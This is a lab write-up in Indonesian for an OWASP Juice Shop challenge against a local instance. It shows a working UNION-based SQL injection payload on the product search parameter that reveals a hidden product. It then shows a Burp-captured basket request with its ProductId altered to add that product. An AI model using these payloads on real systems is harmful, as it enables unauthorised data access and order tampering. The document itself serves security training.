# Injection - Soal 4 (Christmas Offer)


---

## 21 Link Resource
- [OWASP Juice Shop](https://owasp-juice.shop)  
- [SQL Injection UNION attacks - PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks)  
- [SQLite Schema documentation](https://www.sqlite.org/schematab.html)

## 1. Jawaban

### Step 1: Identifying the Injection Point
- Eksplorasi pada fitur **Product Search**.  
- Endpoint yang diuji:  

```
http://127.0.0.1:3000/rest/products/search?q=payload
```

- Parameter `q` terdeteksi sebagai titik **SQL Injection**.  

![Step 1](step%201.png)

---

### Step 2: Crafting the SQL Injection Query
- Payload yang digunakan:  

```sql
test')) UNION SELECT * FROM PRODUCTS WHERE deletedAt IS NOT NULL--
```

- Hipotesis: produk tersembunyi (*Christmas Offer*) ditandai dengan kolom `deletedAt` yang **tidak null**.  
- Query berhasil menampilkan produk yang tidak muncul di listing normal.  

![Step 2](step%202.png)

---

### Step 3: Retrieving the Product ID
- Dari hasil SQL Injection, ditemukan detail produk tersembunyi.  
- **Product ID dari Christmas Offer adalah 10**.  

![Step 3](step3.png)

---

### Step 4: Adding the Product to the Cart
- Tambahkan produk biasa ke keranjang.  
- Tangkap request dengan Burp Suite.  
- Contoh request normal:  

```http
POST /api/BasketItems/
{
  "ProductId": 1,
  "BasketId": 1,
  "quantity": 1
}
```

- Ubah `ProductId` menjadi **10** untuk menambahkan *Christmas Offer*:  

```http
POST /api/BasketItems/
{
  "ProductId": 10,
  "BasketId": 1,
  "quantity": 1
}
```

- Setelah request dikirim, *Christmas Offer* berhasil masuk ke keranjang. ✅  



---

